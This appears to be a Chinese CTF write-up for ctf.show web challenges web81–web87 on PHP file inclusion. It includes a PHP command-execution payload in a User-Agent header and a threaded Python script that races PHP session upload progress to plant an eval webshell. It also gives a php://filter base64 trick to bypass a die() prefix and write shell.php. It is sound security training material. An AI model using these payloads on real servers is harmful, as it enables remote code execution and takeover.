+<p>跟第一次发包类似，将User-Agent改为<code>&lt;?php system('tac fl0g.php');?&gt;</code>发包后可得到flag</p>
+<h3 id="web82" class="headerLink">
+    <a href="#web82" class="header-mark"></a>2.5 [web82]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 19:34:45
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	过滤了点之后我们也不能使用文件包含来getshell了，因此我们只能利用无后缀的文件，因为在php中我们能够利用的无后缀的文件就是session，我们可以利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p>
+<blockquote>
+<p><strong>前瞻知识</strong></p>
+<p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">upload_progress</span><span class="o">.</span><span class="n">enable</span> <span class="o">=</span> <span class="n">on</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">upload_progress</span><span class="o">.</span><span class="n">cleanup</span> <span class="o">=</span> <span class="n">on</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">upload_progress</span><span class="o">.</span><span class="n">prefix</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">upload_progress</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
+<li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li>
+<li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
+<li><code>prefix+name</code>将表示为session中的键名;</li>
+<li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li>
+</ul>
+<p><strong>过程分析</strong></p>
+<p>如果<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。</p>
+<p>但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=rikka，PHP将会在服务器上创建一个文件<code>/tmp/sess_rikka</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里；</p>
+<p>简而言之，我们自定义的PHPSESSID的值会变成文件名，比如定义PHPSESSID:rikka，文件名即为/tmp/sess_rikka，而PHP_SESSION_UPLOAD_PROGRESS的值即为该文件的内容</p>
+</blockquote>
+<p>可以直接用脚本进行发包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sessID</span> <span class="o">=</span> <span class="s1">&#39;rikka&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;file_put_contents(&#39;/var/www/html/1.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;);&#34;</span>  <span class="c1"># read()中需要post的内容</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fileBytes</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                               <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">                               <span class="c1"># 改参数的值就是/tmp/sess_rikka文件的内容</span>
+</span></span><span class="line"><span class="cl">                           <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                               <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">sessID</span>
+</span></span><span class="line"><span class="cl">                           <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">files</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                               <span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;rikka.png&#39;</span><span class="p">,</span> <span class="n">fileBytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                           <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                           <span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;?file=/tmp/sess_&#39;</span> <span class="o">+</span> <span class="n">sessID</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span> <span class="n">sessID</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;1.php&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res2</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;+++done+++&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res2</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>   <span class="c1"># 开启多线程的对象</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>               <span class="c1"># 开5个线程</span>
+</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>       <span class="c1"># 唤醒线程</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功后访问<code>http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/1.php</code>然后POST发包进行命令执行</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png" title="image-20230711113314122" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711113314122.png 2x"
+            sizes="auto"
+            alt="image-20230711113314122">
+    </a></figure></p>
+<p>下面这种方法比较麻烦：</p>
+<p>构造一个文件上传的表单，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://522071b1-f31d-4623-80b8-334e5e39b8b4.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;123&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传1.php文件同时抓包，添加</p>
+<p><code>Cookie :PHPSESSID=flag</code></p>
+<p>session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag” 然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png" title="image-20230711220902738" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711220902738.png 2x"
+            sizes="auto"
+            alt="image-20230711220902738">
+    </a></figure></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
+<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png" title="image-20230712002040671" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002040671.png 2x"
+            sizes="auto"
+            alt="image-20230712002040671">
+    </a></figure></p>
+<p>两个包payload设置如下</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png" title="image-20230712002111370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002111370.png 2x"
+            sizes="auto"
+            alt="image-20230712002111370">
+    </a></figure></p>
+<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png" title="image-20230712002130908" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002130908.png 2x"
+            sizes="auto"
+            alt="image-20230712002130908">
+    </a></figure></p>
+<p>修改传参内容，得到flag
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png" title="image-20230712002220645" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712002220645.png 2x"
+            sizes="auto"
+            alt="image-20230712002220645">
+    </a></figure></p>
+<h3 id="web83web86" class="headerLink">
+    <a href="#web83web86" class="header-mark"></a>2.6 [web83]~[web86]</h3><p>web82的脚本都可以解</p>
+<p>[web84]</p>
+<p>方法与web82一样，虽然session被删除了，但请求线程比较多，刚删掉就又写进去了</p>
+<p>[web85]</p>
+<p>检查file的内容是否包含&lt;，web82脚本方法可行</p>
+<h3 id="web87" class="headerLink">
+    <a href="#web87" class="header-mark"></a>2.7 [web87]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 21:57:55
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>​	file_put_contents() 函数用于把字符串写入文件，成功返回写入到文件内数据的字节数，失败则返回 FALSE。</p>
+<p>​	file_get_contents() 把整个文件读入一个字符串中。
+该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。
+​	类似函数：<a href="http://www.w3cschool.cn/php/func-filesystem-fopen.html" target="_blank" rel="noopener noreferrer">fopen() </a>函数打开一个文件或 URL。区别是fopen()打开网页后，返回的不是字符串，不能直输出的，还需要用到fgets()这个函数来获取字符串。fgets()函数是从文件指针中读取一行。文件指针必须是有效的，必须指向由 fopen() 或 fsockopen() 成功打开的文件(并还未由 fclose() 关闭)。</p>
+</blockquote>
+<p>死亡绕过：</p>
+<p>原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码</p>
+<h4 id="base64编码绕过" class="headerLink">
+    <a href="#base64%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87" class="header-mark"></a>2.7.1 base64编码绕过</h4><p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<p>当<code>$content</code>被加上了<code>&lt;?php die('大佬别秀了');?&gt;</code>以后，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 来首先对其解码。在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符</p>
+<p>base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符</p>
+<p>&ldquo;phpdieaa&quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php die('大佬别秀了');?&gt;</code>没有了。</p>
+<p><code>file=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
